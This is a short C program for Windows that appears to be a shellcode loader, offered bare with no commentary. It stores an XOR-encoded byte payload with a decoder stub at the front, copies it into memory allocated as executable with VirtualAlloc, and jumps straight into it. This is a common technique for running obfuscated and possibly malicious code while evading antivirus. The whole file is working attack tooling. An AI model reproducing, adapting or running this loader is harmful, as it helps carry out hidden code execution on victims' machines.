
# include <stdio.h>
# include <windows.h>


int main() {


unsigned char payload[]=
"\xeb\x2c\x5e\x56\x89\xf7\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x8a\x06\x32\x46\x01\x88\x07\x46\x47\x41\x80\xf9\x02\x75\xf1\x46\x31\xc9\x66\x83\xc2\x03\x66\x81\xfa\x2c\x01\x75\xe3\x58\xff\xe0\xe8\xcf\xff\xff\xff\xb2\x81\x48\xbd\xd9\x52\x2a\x63\x53\x25\xae\xe7\x2d\x21\xaa\x3a\x73\x6f\x73\xf8\xa1\x7f\x77\xfc\xcc\x8d\xad\xce\x45\x4c\x2e\xae\xd6\x6b\x67\x54\x05\x70\x82\xd5\x5e\xb5\xd2\xd1\xbc\x44\x78\xf3\xf0\x9d\xe5\xf5\xf6\x1d\xa3\x28\x6d\x6d\x4d\x4e\x80\x43\x70\xba\x68\xe3\x86\xb2\x22\xac\xaf\x5c\xb6\xf4\x75\xe3\xdd\x9a\xea\x8f\xfb\xb8\xe8\x9d\x44\xb6\x37\x8c\xf2\xf6\x15\x67\x08\x4f\x2c\x6d\xb7\xc2\x2b\x0f\x84\xf1\x0c\x28\x2b\xeb\x18\x7e\x92\x19\x0d\xa0\xf6\x7d\x69\x1c\x00\x87\x84\x77\x19\x92\xe6\x05\x93\x6f\x2c\x2f\xdc\xc0\xf3\x0c\x3c\x6b\x03\xa0\xc1\xb3\x0e\x77\x36\xb4\xdc\x90\x97\xfe\x9c\x4d\x3f\x57\x88\xc4\xab\x86\xe7\x83\x47\x13\x40\xf3\x0c\xda\x6b\x58\x91\x08\x5f\x39\x98\x21\x12\x6f\x5d\x0c\x89\xe1\x94\xd9\xaa\xcf\xc4\xb6\xe2\xd0\x2f\xff\xaf\xf8\x90\x22\x4d\x35\x65\x24\x25\x68\x96\xda\xcc\xe8\xeb\xcc\xa4\xc5\x15\x72\x17\x02\x40\x28\x21\x6c\x09\x66\x15\x66\xec\xb8\xe8\xa7\x58\x8e\x5f\x08\x60\xb0\xc2\xae\x30\x54\x75\x1f\x77\x18\x6a\x4a\x1d\x4d\x22\x4a\xaa\xe2\x87\x05\x69\x05\xd0\x5b\x97\x3f\x68\x3f\x2c\x7d\x2a\x2b\xd4\x04\x7a\x2d\x45\x46\x23\x50\x3d\x4e\x4f\x6a\x94\xd8\xaf\x8b\x88\x70\x18\x48\x68\x1a\x75\x26\x45\x2d\x12\x57\x2f\xd1\xb8\xcc\xf2\xa6\xf5\xae\x51\x87\x9a\xcd\x32\xb7\x67\xf7";


char* code;
int size = sizeof(payload);
code = (char*)VirtualAlloc(NULL,size , MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(code, payload, size );
((void(*)())code)();
return(0);
}